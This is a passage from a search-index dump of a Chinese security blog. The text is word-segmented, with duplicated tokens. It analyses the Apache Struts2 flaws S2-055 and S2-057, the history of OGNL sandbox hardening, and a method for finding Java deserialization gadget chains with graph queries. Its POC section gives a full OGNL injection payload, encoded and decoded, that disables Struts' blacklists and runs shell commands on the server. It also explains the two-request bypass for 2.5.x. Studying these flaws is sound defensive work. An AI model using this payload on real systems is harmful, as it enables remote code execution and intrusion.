\u4e86\u89e3 \uff0c \u5c31 \u4e0d \u53bb \u8bef\u4eba \u4eba\u5b50 \u5b50\u5f1f \u8bef\u4eba\u5b50\u5f1f \u4e86 \u3002   \u4fee\u590d \u76f4\u63a5 \u53c2\u8003 https : / / www . freebuf . com / vuls / 217482 . html","title":"\u4fee\u590d"},{"location":"blog/2020/talk_about_struts2/#18-s2-055","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.5   -   Struts   2.5 . 14   S2 - 055 \u6f0f\u6d1e \u539f\u7406 \u8ddf S2 - 052 \u4e00\u6837 \uff0c \u7531 jackson \u5e93 \u5904\u7406 json \u5185\u5bb9 \u65f6 \u4ea7\u751f \u7684 \u6f0f\u6d1e \uff0c \u8fd9\u91cc \u9ed8\u8ba4 \u4e0d\u662f \u7528 jackson \u5904\u7406 json \u5185\u5bb9 \u7684 \uff0c \u5f97 \u5728 struts . xml \u914d\u7f6e   < bean   type =   \" org . apache . struts2 . rest . handler . ContentTypeHandler \"   name =   \" jackson \"   class =   \" org . apache . struts2 . rest . handler . JacksonLibHandler \"   / >   < constant   name =   \" struts . rest . handlerOverride . json \"   value =   \" jackson \"   / >   \u8fd9\u91cc \u672c\u8eab \u56e0\u4e3a \u662f\u56e0\u4e3a jackson \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \u4ea7\u751f \u7684 \uff0c \u540e\u9762 \u62bd\u7a7a \u5206\u6790 \u4e00\u4e0b \u8fd9\u4e2a jackson \uff0c \u8fd9\u91cc \u4e0d \u7ee7\u7eed \u5206\u6790 \u4e86   \u56e0\u4e3a \u9700\u8981 \u914d\u7f6e \u624d \u53ef\u4ee5 \u6253 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 \u5371\u5bb3 \u5e76 \u6ca1\u6709 \u60f3 xstream \u4e00\u6837 \u4e25\u91cd   \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u89c1   http : / / xxlegend . com / 2017 / 12 / 06 / S2 - 055% E6% BC% 8F% E6% B4% 9E% E7% 8E% AF% E5% A2% 83% E6% 90% AD% E5% BB% BA% E4% B8% 8E% E5% 88% 86% E6% 9E% 90 /","title":"18 .   S2 - 055"},{"location":"blog/2020/talk_about_struts2/#19-s2-057","text":"\u5f71\u54cd \u8303\u56f4 \uff1a Struts   2.0 . 4   -   Struts   2.3 . 34 ,   Struts   2.5 . 0   -   Struts   2.5 . 16   \u5317\u4eac \u65f6\u95f4 8 \u6708 22 \u65e5 13 \u65f6 \uff0c Apache \u5b98\u65b9 \u53d1\u5e03 \u901a\u544a \u516c\u5e03 \u4e86 Struts2 \u4e2d \u4e00\u4e2a \u8fdc\u7a0b \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c \u6f0f\u6d1e \uff08 CVE - 2018 - 11776 \uff09 \u3002 \u8be5 \u6f0f\u6d1e \u5728 \u4e24\u79cd \u60c5\u51b5 \u4e0b \u5b58\u5728 \uff0c \u7b2c\u4e00 \uff0c \u5728 xml \u914d\u7f6e \u4e2d\u672a \u8bbe\u7f6e namespace \u503c \uff0c \u4e14 \u4e0a\u5c42 \u52a8\u4f5c \u914d\u7f6e \uff08 upper   action ( s )   configurations \uff09 \u4e2d\u672a \u8bbe\u7f6e \u6216\u7528 \u901a\u914d\u7b26 namespace \u503c \u3002 \u7b2c\u4e8c \uff0c \u4f7f\u7528 \u672a \u8bbe\u7f6e   value \u548c action \u503c \u7684 url \u6807\u7b7e \uff0c \u4e14 \u4e0a\u5c42 \u52a8\u4f5c \u914d\u7f6e \uff08 upper   action ( s )   configurations \uff09 \u4e2d\u672a \u8bbe\u7f6e \u6216\u7528 \u901a\u914d\u7b26 namespace \u503c \u3002   https : / / paper . seebug . org / 682 /   \u8fd9\u91cc \u4e00\u79cd \u914d\u7f6e \u65b9\u6848 \u662f   \u6ca1\u6709 \u914d\u7f6e namespace \uff0c \u8bbf\u95ee s2057 . action \u90fd \u4f1a \u5bfc\u5411 test . action \uff0c \u8fd9\u91cc \u5904\u7406 redirectAction \u7684 \u662f   org . apache . struts2 . dispatcher . ServletActionRedirectResult # execute   ServletActionRedirectResult   \u4f1a \u5c06 namespace \u4e00\u8d77 \u62fc\u63a5 \u8fdb location \uff0c \u6bd4\u5982   / s2vuls / $ { 1 * 2 } / s2057 . action   , \u5176 namespace \u4e3a   / $ { 1 * 2 }   , actionName \u4e3a \u8df3\u8f6c \u7684 test \uff0c \u6700\u7ec8 location \u4e3a   / $ { 1 * 2 } / test . action   \u3002 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u5f15\u5165 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u770b \u540e\u7eed \u7684 \u4e00\u4e2a \u5904\u7406   org . apache . struts2 . dispatcher . StrutsResultSupport # execute   \u5230 \u8fd9\u91cc \uff0c \u5c31 \u5f00\u59cb \u719f\u6089 \u8d77\u6765 \u719f\u6089\u8d77\u6765 \u4e86 \uff0c \u5c31\u662f S2 - 012 \u7684 \u6f0f\u6d1e \u89e6\u53d1 \u70b9   \u4f20\u5165 \u4e86   TextParseUtil . translateVariables   \uff0c \u5230 \u8fd9\u91cc \u5c31 \u7ed3\u675f \u4e86 \uff0c \u540e\u7eed \u5c06 \u8c03\u7528 OGNL . getValue","title":"19 .   S2 - 057"},{"location":"blog/2020/talk_about_struts2/#poc_16","text":"\u5728 2.3 . x \u7248\u672c \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u7528 S2 - 045 \u7684 poc \u6253   / % 24% 7B% 28% 23dm% 3D @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS% 29 .% 28% 23ct% 3D% 23request% 5B% 27struts . valueStack% 27% 5D . context% 29 .% 28% 23cr% 3D% 23ct% 5B% 27com . opensymphony . xwork2 . ActionContext . container% 27% 5D% 29 .% 28% 23ou% 3D% 23cr . getInstance% 28 @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class% 29% 29 .% 28% 23ou . getExcludedPackageNames% 28% 29 . clear% 28% 29% 29 .% 28% 23ou . getExcludedClasses% 28% 29 . clear% 28% 29% 29 .% 28% 23ct . setMemberAccess% 28% 23dm% 29% 29 .% 28% 23cmd% 3D% 27whoami% 27% 29 .% 28% 23iswin% 3D% 28 @ java . lang . System @ getProperty% 28% 27os . name% 27% 29 . toLowerCase% 28% 29 . contains% 28% 27win% 27% 29% 29% 29 .% 28% 23cmds% 3D% 28% 23iswin% 3F% 7B% 27cmd% 27% 2C% 27 / c% 27% 2C% 23cmd% 7D% 3A% 7B% 27 / bin / bash% 27% 2C% 27 - c% 27% 2C% 23cmd% 7D% 29% 29 .% 28% 23p% 3Dnew% 20java . lang . ProcessBuilder% 28% 23cmds% 29% 29 .% 28% 23p . redirectErrorStream% 28true% 29% 29 .% 28% 23process% 3D% 23p . start% 28% 29% 29 .% 28% 23ros% 3D% 28 @ org . apache . struts2 . ServletActionContext @ getResponse% 28% 29 . getOutputStream% 28% 29% 29% 29 .% 28 @ org . apache . commons . io . IOUtils @ copy% 28% 23process . getInputStream% 28% 29% 2C% 23ros% 29% 29 .% 28% 23ros . flush% 28% 29% 29% 7D / s2057 . action   \u800c \u5bf9\u4e8e 2.5 . x \u7248\u672c \uff0c \u6211\u4eec \u9700\u8981 \u597d\u597d \u5206\u6790 \u4e00\u4e0b   $   {   (   #   ct   =   #   request   [   '   struts   .   valueStack   '   ]   .   context   ) .   (   #   cr   =   #   ct   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) .   (   #   ou   =   #   cr   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) .   (   #   ou   .   setExcludedClasses   (   ' '   ) ) .   (   #   ou   .   setExcludedPackageNames   (   ' '   ) ) .   (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) .   (   #   ct   .   setMemberAccess   (   #   dm   ) ) . (   #   cmd   =   '   whoami   '   ) .   (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) .   (   #   cmds   =   (   #   iswin   ?   {   '   cmd   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) .   (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) . (   #   p   .   redirectErrorStream   (   true   ) ) .   (   #   process   =   #   p   .   start   ( ) ) .   (   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ) .   (   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ) . (   #   ros   .   flush   ( ) )   }   \u4ece poc \u6765\u770b \uff0c \u4ece \u7b2c 7 \u884c \u5f00\u59cb \u90fd \u662f \u6211\u4eec \u719f\u6089 \u7684 \u64cd\u4f5c \uff0c \u90a3\u4e48 \u524d\u9762 \u591a \u4e86 \u90a3\u4e48 \u591a \u662f \u5728 \u505a \u4ec0\u4e48 \uff1f   \u53c2\u8003 \uff1a https : / / paper . seebug . org / 794 / # 35 - struts - 2516   \u5728 struts2   2.5 . 13 \u7248\u672c \u4e4b\u540e \uff0c ognl \u5e93 \u8fdb\u884c \u4e86 \u66f4\u65b0 \uff0c \u4ece 3.1 . 12 - > 3.1 . 15 \uff0c \u5176 \u4e3b\u8981 \u7684 \u4e00\u4e2a \u53d8\u5316 \u662f \u7981\u6b62 \u8bbf\u95ee   context . map   \uff0c OgnlContext \u7684 get \u3001 put \u3001 remove \u51fd\u6570 \u4e2d \u90fd \u5220\u9664 \u4e86 \u5bf9 \u5f53\u524d context \u7684 \u64cd\u4f5c   \u6b64\u5916 \uff0c excluded \u76f8\u5173 \u7684 \u96c6\u5408 \u88ab \u8bbe\u7f6e \u4e3a \u4e0d\u53ef \u53d8 \uff0c \u65e0\u6cd5 \u901a\u8fc7 clear \u7684 \u65b9\u5f0f \u6765 \u6e05\u9664   \u9488\u5bf9 \u4e0a\u9762 \u4e24\u79cd \u7684 \u7ed5\u8fc7   \u6587\u7ae0 \u63d0\u51fa \u4e86 \u8fd9\u4e48 \u4e00\u79cd \u601d\u8def :   \u6ca1\u6709 \u529e\u6cd5 \u4f7f\u7528   context . map   \uff0c \u53ef\u4ee5 \u8c03\u7528   attr   \uff0c \u524d \u6587\u8bf4 \u8fc7   attr   \u4e2d \u4fdd\u5b58 \u7740 \u6574\u4e2a   context   \u7684 \u53d8\u91cf \u4e0e \u65b9\u6cd5 \uff0c \u53ef\u4ee5 \u901a\u8fc7   attr   \u4e2d \u7684 \u65b9\u6cd5 \u8fd4\u56de \u7ed9 \u6211\u4eec \u4e00\u4e2a   context . map   \u3002   \u6ca1\u6709 \u529e\u6cd5 \u76f4\u63a5 \u8c03\u7528   excludedClasses   \uff0c \u4e5f \u5c31 \u4e0d\u80fd \u4f7f\u7528   clear   \u65b9\u6cd5 \u6765 \u6e05\u7a7a \uff0c \u4f46\u662f \u8fd8 \u53ef\u4ee5 \u5229\u7528   setter   \u6765 \u628a   excludedClasses   \u7ed9 \u8bbe\u7f6e \u6210\u7a7a   \u6e05\u7a7a \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5229\u7528   DefaultMemberAccess   \u6765 \u8986\u76d6   _ memberAccess   \uff0c \u6765 \u6267\u884c \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u4e86 \u3002   \u800c \u8fd9\u91cc \u53c8 \u4f1a \u51fa\u73b0 \u4e00\u4e2a \u95ee\u9898 \uff0c \u5f53 \u6211\u4eec \u4f7f\u7528   OgnlUtil   \u7684   setExcludedClasses   \u548c   setExcludedPackageNames   \u5c06 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7f6e \u7a7a\u65f6 \u5e76\u975e \u662f \u5bf9\u4e8e \u6e90 \uff08 \u5168\u5c40 \u7684 OgnlUtil \uff09 \u8fdb\u884c \u7f6e\u7a7a \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4   _ memberAccess   \u662f \u6e90 \u6570\u636e \u7684 \u4e00\u4e2a \u5f15\u7528 \uff0c \u5c31 \u50cf \u524d\u6587 \u6240\u8bf4 \u7684 \uff0c \u5728 \u6bcf\u6b21   createAction   \u65f6 \u90fd \u662f \u901a\u8fc7   setOgnlUtil   \u5229\u7528 \u5168\u5c40 \u7684 \u6e90 \u6570\u636e \u521b\u5efa \u4e00\u4e2a \u5f15\u7528 \uff0c \u8fd9\u4e2a \u5f15\u7528 \u5c31\u662f \u4e00\u4e2a   MemberAccess   \u5bf9\u8c61 \uff0c \u4e5f \u5c31\u662f   _ memberAccess   \u3002 \u6240\u4ee5 \u8fd9\u91cc \u53ea\u4f1a \u5f71\u54cd \u8fd9\u6b21 \u8bf7\u6c42 \u7684   OgnlUtil   \u800c \u5e76\u672a \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a \u65b0 \u7684   _ memberAccess   \u5bf9\u8c61 \uff0c \u6240\u4ee5 \u65e7 \u7684   _ memberAccess   \u5bf9\u8c61 \u4ecd \u672a \u6539\u53d8 \u3002   \u800c \u7a81\u7834 \u8fd9\u79cd \u9650\u5236 \u7684 \u65b9\u5f0f \u5c31\u662f \u518d\u6b21 \u53d1\u9001 \u4e00\u4e2a \u8bf7\u6c42 \uff0c \u5c06 \u4e0a \u4e00\u6b21 \u8bf7\u6c42 \u5df2\u7ecf \u7f6e\u7a7a \u7684   OgnlUitl   \u4f5c\u4e3a \u6e90 \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a   _ memberAccess   \uff0c \u8fd9\u6837 \u5728 \u7b2c\u4e8c \u4e8c\u6b21 \u7b2c\u4e8c\u6b21 \u8bf7\u6c42 \u4e2d   _ memberAccess   \u5c31\u662f \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u88ab \u7f6e \u7a7a \u7684 \u60c5\u51b5 \uff0c \u8fd9\u4e2a \u65f6\u5019 \u5c31 \u91ca\u653e \u4e86   DefaultMemberAccess   \uff0c \u5c31 \u53ef\u4ee5 \u8fdb\u884c \u6b63\u5e38 \u7684 \u8986\u76d6 \u4ee5\u53ca \u6267\u884c \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u3002   \u770b\u8fc7 \u4e0a\u9762 \u7684 \u5206\u6790 \u540e \u518d \u6765\u770b poc \uff0c \u7b2c\u4e8c \u4e8c\u884c \u7b2c\u4e8c\u884c \u83b7\u53d6 \u4e86 context \uff0c \u7b2c 3   4   5   6 \u884c \u6e05\u9664 \u4e86 excluded \u76f8\u5173 \u7684 \u96c6\u5408 \uff0c \u4f46 \u5176 \u5f53\u524d \u7684 \u8bf7\u6c42 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u8fd8\u662f \u5b58\u5728 \u7684 \uff0c \u6240\u4ee5 \u5728 2.5 . x \u7248\u672c \u6211\u4eec \u9700\u8981 \u53d1\u9001 \u4e24\u6b21 \u8fd9\u4e2a poc \uff0c \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u6e05\u695a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u7b2c\u4e8c \u4e8c\u6b21 \u7b2c\u4e8c\u6b21 \u8986\u76d6   _ memberAccess   \u5e76 \u8c03\u7528 \u9759\u6001 \u51fd\u6570","title":"POC"},{"location":"blog/2020/talk_about_struts2/#0x03","text":"\u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c \u53c2\u8003 \u4e86 \u5f88\u591a \u5e08\u5085 \u4eec \u7684 \u7b14\u8bb0 \uff0c \u8fd9\u91cc \u7279\u522b \u611f\u8c22 \u7279\u522b\u611f\u8c22 \u4e00\u4e0b XD   \u4ece \u6574\u4e2a s2 \u6f0f\u6d1e \u7684 \u5386\u7a0b \u6765\u770b \uff0c \u80fd \u770b\u5230 \u5f88\u591a \u6f0f\u6d1e \u5176\u5b9e \u5229\u7528 \u70b9 \u662f \u76f8\u4f3c \u7684 \uff0c \u53ea\u662f \u8bf4 \u4ece \u54ea\u4e2a \u5165\u53e3 \u8fdb\u53bb \u53ef\u80fd \u6709\u6240 \u4e0d\u540c \u6709\u6240\u4e0d\u540c \u3002 \u8fd9\u79cd \u6f0f\u6d1e \u7684 \u5206\u6790 \u6211 \u8ba4\u4e3a \u7528 \u6570\u636e \u6570\u636e\u6d41 \u5206\u6790 \u662f \u975e\u5e38 \u5408\u9002 \u7684 \u3002 lgtm \u7684 \u5e08\u5085 \u5c31 \u7528 \u4e86 \u4ed6\u4eec \u7684 codeql \u53d1\u73b0 \u4e86 S2 - 057 \u8fd9\u4e2a \u6f0f\u6d1e \u3002   \u4f46\u662f \u5b98\u65b9 \u5728 \u4e00\u6b21 \u6b21\u6b21 \u4e00\u6b21\u6b21 \u4fee\u590d \u4e2d \uff0c \u5bf9\u4e8e ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u9650\u5236 \u7684 \u8d8a\u6765 \u8d8a\u6765\u8d8a \u591a \uff0c \u4f7f\u5f97 \u5982\u4eca \u5c31\u7b97 \u51fa\u73b0 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6ce8\u5165 \u4e5f \u5f88 \u96be \u9020\u6210 RCE \u7684 \u6548\u679c \u3002   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u770b   lucifaer   \u5e08\u5085 \u7684 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u4ece \u65f6\u95f4 \u7ebf \u6765\u770b \uff0c   struts2   2.3 . 14.1 \u4e4b\u524d \uff0c ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u6ca1\u6709 \u4ec0\u4e48 \u969c\u788d \uff1b 2.3 . 14.1 \u589e\u52a0 \u4e86   SecurityMemberAccess   \uff0c \u7981\u6b62 \u9759\u6001 \u51fd\u6570 \u6267\u884c   allowStaticMethodAccess = false   \uff0c \u5728 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u91cc\u9762 \u53ef\u4ee5 \u91cd\u65b0 \u7f6e \u4e3a true \uff1b \u540e\u7eed \u8fd9\u4e2a \u503c \u88ab \u6539\u6210 \u4e86 final \uff0c \u65e0\u6cd5 \u88ab \u66f4\u6539   struts2   2.3 . 20 \u4e4b\u524d \uff0c \u867d\u7136 \u4e0d\u80fd \u6539   allowStaticMethodAccess   \uff0c \u4f46\u662f \u53ef\u4ee5 \u901a\u8fc7 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u65b9\u5f0f \u7ed5\u8fc7 \uff1b 2.3 . 20 \u4e4b\u540e \uff0c \u589e\u52a0 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355   struts2   2.3 . 29 \u4e4b\u524d \uff0c \u901a\u8fc7   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u8fd9\u79cd \u65b9\u5f0f \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u6e05\u7a7a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff1b 2.3 . 29 \u4e4b\u540e \uff0c \u65b0\u589e \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u9650\u5236 \u4e86 \u8fd9\u79cd \u65b9\u5f0f \u7684 \u6267\u884c   struts2   2.3 . 34 / 2.5 . 16 \u4e4b\u524d \uff0c \u901a\u8fc7 container \u5b9e\u4f8b \u5316   ognlUtil   \uff0c \u6e05\u7a7a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u8be6\u7ec6 \u89c1 S2 - 045 \uff1b \u4e4b\u540e \u7981\u6b62 \u4e86 context . map \u7684 \u8bbf\u95ee \u548c excludedClasses \u4e0d\u53ef \u53d8 \uff0c \u4e0d\u80fd \u901a\u8fc7 clear \u6e05\u695a   struts2   2.5 . 17 \u4e4b\u524d \uff0c \u901a\u8fc7 request \u4e2d \u83b7\u53d6 context \uff0c \u7ed5\u8fc7 context . map \u7981\u6b62 \u8bbf\u95ee \u7684 \u9650\u5236 \uff0c \u8be6\u7ec6 \u89c1 S2 - 057 \uff1b \u4e4b\u540e \u65b0\u589e \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u5b8c\u5168 \u7981\u6b62 \u901a\u8fc7 ognl \u7684 \u5305\u6765 \u5bf9 stack \u505a \u64cd\u4f5c   \u540e\u7eed \u51e0\u4e2a \u7248\u672c \u4e5f \u66f4\u65b0 \u4e86 \u5f88\u591a \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd \uff0c \u5177\u4f53 \u89c1 lucifaer \u5e08\u5085 \u7684 \u6587\u7ae0   \u5728 \u5206\u6790 \u5b8c struts2 \u4e4b\u540e \uff0c \u4e5f \u6539\u53d8 \u4e86 \u5bf9 \u5f88 \u6709\u540d \u7684 \u6f0f\u6d1e \u7684 \u611f\u5b98 \uff0c \u4ee5\u524d \u603b \u89c9\u5f97 struts \u6f0f\u6d1e \u90fd \u662f \u6bd4\u8f83 \u590d\u6742 \u6bd4\u8f83\u590d\u6742 \u7684 \uff0c \u4f46\u662f \u73b0\u5728 \u60f3\u60f3 \u6709 \u7cbe\u5f69 \u590d\u6742 \u7684 \u5730\u65b9 \u4e5f \u4f1a \u6709 \u5f88\u50bb \u7684 \u5730\u65b9 \u3002   \u4e0d\u80fd \u5bf9 \u8fd8 \u6ca1\u6709 \u5206\u6790 \u8fc7 \u7684 \u6846\u67b6 \u6216\u8005 \u5e94\u7528 \u6301\u6709 \u754f\u60e7 \u4e4b\u5fc3 \uff0c \u5171\u52c9 XD","title":"0x03   \u603b\u7ed3"},{"location":"blog/2021/how_to_find_gadget_chains/","tags":["java"],"text":"# 1   \u524d\u8a00   Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u4e00\u76f4 \u90fd \u662f \u56fd\u5185 \u5185\u5916 \u56fd\u5185\u5916 \u7814\u7a76 \u70ed\u70b9 \u4e4b\u4e00 \uff0c \u4f46 \u5f53\u524d \u81ea\u52a8 \u81ea\u52a8\u5316 \u65b9\u6848 gadgetinspector \u7684 \u6548\u679c \u5e76 \u4e0d\u597d \u3002 \u6240\u4ee5 \u76ee\u524d \u591a\u6570 \u5e08\u5085 \u4ecd\u7136 \u662f \u4ee5 \u4eba\u5de5 + \u81ea\u7814 \u5c0f \u5de5\u5177 \u7684 \u65b9\u5f0f \u8fdb\u884c \u5229\u7528 \u94fe \u7684 \u6316\u6398 \u3002 \u76ee\u524d \u6211 \u4e2a\u4eba \u4e5f \u5728 \u627e \u4e00\u4e2a \u5408\u9002 \u7684 \u65b9\u6cd5 \u6765 \u9ad8\u6548 \u6316\u6398 \u5229\u7528 \u94fe \uff0c \u672c\u6587 \u5c06 \u4e3b\u8981 \u4ecb\u7ecd \u6211 \u81ea\u5df1 \u7684 \u4e00\u4e9b \u6316\u6398 \u5fc3\u5f97 \uff0c \u8f85\u4ee5 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe CVE - 2021 - 21346 \u4e3a\u4f8b \u3002   # 1   \u524d\u7f6e \u77e5\u8bc6   \u8fd9\u91cc \u524d\u7f6e \u77e5\u8bc6 \u4e3b\u8981 \u6709 \u4e24\u7c7b \uff1a XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u539f\u7406 \u548c \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5   XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u539f\u7406   \u8fd9\u91cc \u5177\u4f53 \u7684 \u539f\u7406 \u53ef\u4ee5 \u89c1   \u56de\u987e XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   \uff0c \u8fd9\u91cc \u6211\u4eec \u53ea \u9700 \u77e5\u9053 XStream \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u4e2d \u5b83 \u7684 \u9650\u5236 \u662f \u5f88\u5c11 \u7684 \uff08 \u4e0d\u7528 PureJavaReflectionProvider \uff09 \uff0c \u5b83 \u751a\u81f3 \u80fd \u8fd8\u539f \u6784\u9020 \u597d \u7684 Method \u5bf9\u8c61 \u3002 \u6240\u4ee5 \u8fd9\u91cc \u6211\u4eec \u9700\u8981 \u6e05\u695a \u7684 \u662f \u5b83 \u7684 \u89e6\u53d1 \u51fd\u6570 source \u662f \u4ec0\u4e48 \uff0c \u770b \u6211 \u4e0a\u9762 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u80fd \u77e5\u9053 \u5171\u6709 hashCode \u51fd\u6570 \uff08 Map \u65b9\u5f0f \uff09 \u3001 compareTo \u51fd\u6570 \uff08 TreeSet \u65b9\u5f0f \uff09 \u3001 compare \u51fd\u6570 \uff08 PriorityQueue \u65b9\u5f0f \uff09 \u3002   \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5   \u8fd9\u91cc \u7528\u5230 \u4e86 \u6211 \u5373\u5c06 \u5f00\u6e90 \u7684 \u5de5\u5177   tabby   \uff0c \u8be5 \u5de5\u5177 \u5c06 jar \u6587\u4ef6 \u8f6c\u5316 \u4e3a \u4ee3\u7801 \u5c5e\u6027 \u56fe \uff0c \u7136\u540e \u540e\u7eed \u6211\u4eec \u53ef\u4ee5 \u7528 neo4j \u7684 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5 \u8fdb\u884c \u5229\u7528 \u94fe \u7684 \u67e5\u627e \uff0c \u6240\u4ee5 \u6211\u4eec \u9700\u8981 \u6709 \u4e00\u5b9a \u7684 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u67e5\u8be2 \u8bed\u6cd5 \u7684   \u57fa\u7840   # 2   \u5229\u7528 \u94fe \u6316\u6398   \u9996\u5148 \u672c\u6b21 \u9488\u5bf9 \u7684 \u662f JDK \u76f8\u5173 Jar \u6587\u4ef6 \u7684 \u5229\u7528 \u94fe \u68c0\u6d4b \u5206\u6790 \uff0c \u6240\u4ee5 \u5148 \u4f7f\u7528 tabby \u751f\u6210 JDK \u76f8\u5173 \u7684 \u4ee3\u7801 \u5c5e\u6027 \u56fe\u81f3 \u56fe \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u3002 \u6267\u884c \u5b8c \u4ee5\u4e0b \u4e24\u53e5 \u547d\u4ee4 \uff0c \u53ef\u4ee5 \u751f\u6210 \u4e00\u4e2a 28w \u6570\u636e \u8282\u70b9 \uff0c 76w \u5173\u7cfb \u8fb9 \u7684 \u4ee3\u7801 \u5c5e\u6027 \u56fe \uff1a   #   \u751f\u6210 \u56fe \u7f13\u5b58 \u6587\u4ef6   java   - Xmx6g   - jar   target / tabby - 1.0 . 0 - SNAPSHOT . jar   -- isJDKOnly   #   \u5bfc\u5165 Neo4j \u56fe \u6570\u636e   java   - Xmx6g   - jar   target / tabby - 1.0 . 0 - SNAPSHOT . jar   -- isSaveOnly   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6784\u9020 \u56fe \u67e5\u8be2 \u8bed\u8a00 \u67e5\u8be2\u8bed\u8a00 \uff0c \u8fd9\u91cc \u63d0\u4f9b \u4e00\u4e2a \u6a21\u7248   match   (   source   :   Method   )   / /   \u6dfb\u52a0   where \u8bed\u53e5 \u9650\u5236 source \u51fd\u6570   match   (   sink   :   Method   {   IS _ SINK   :   true   }   )   / /   \u6dfb\u52a0   where \u8bed\u53e5 \u9650\u5236 sink \u51fd\u6570   call   apoc   .   algo   .   allSimplePaths   (   m1   ,   source   ,   \" < CALL | ALIAS \"   ,   12   )   yield   path   / /   \u67e5\u627e \u5177\u4f53 \u8def\u5f84   ,   12   \u4ee3\u8868 \u6df1\u5ea6 \uff0c \u53ef\u4ee5 \u4fee\u6539   return   *   limit   20   \u5f53\u524d \u6211\u4eec \u5df2\u7ecf \u786e\u5b9a \u4e86 \u5f53\u524d \u53ef\u4ee5 \u4f7f\u7528 hashCode \u51fd\u6570 \u3001 compareTo \u51fd\u6570 \u3001 compare \u51fd\u6570 \u4f5c\u4e3a source \u51fd\u6570 \uff0c \u90a3\u4e48 \u53ea\u8981 \u518d \u9650\u5236 sink \u51fd\u6570 \u5373\u53ef \uff0c \u5982\u4e0b \u67e5\u8be2 \u8bed\u53e5   match   ( source : Method   { NAME : \" compare \" } )   match   ( sink : Method   { IS _ SINK : true ,   NAME : \" invoke \" } ) < - [ : CALL ] - ( m1 : Method )   call   apoc . algo . allSimplePaths ( m1 ,   source ,   \" < CALL | ALIAS \" ,   12 )   yield   path   return   *   limit   20   \u672c\u6b21 \u5229\u7528 \u94fe \u5c06 \u9650\u5236 \u5371\u9669 \u51fd\u6570 \u4e3a Method . invoke \u51fd\u6570 \uff0c \u5177\u4f53 \u67e5\u8be2 \u7ed3\u679c \u5982\u4e0b \u56fe \u6240\u793a   \u53ef\u4ee5 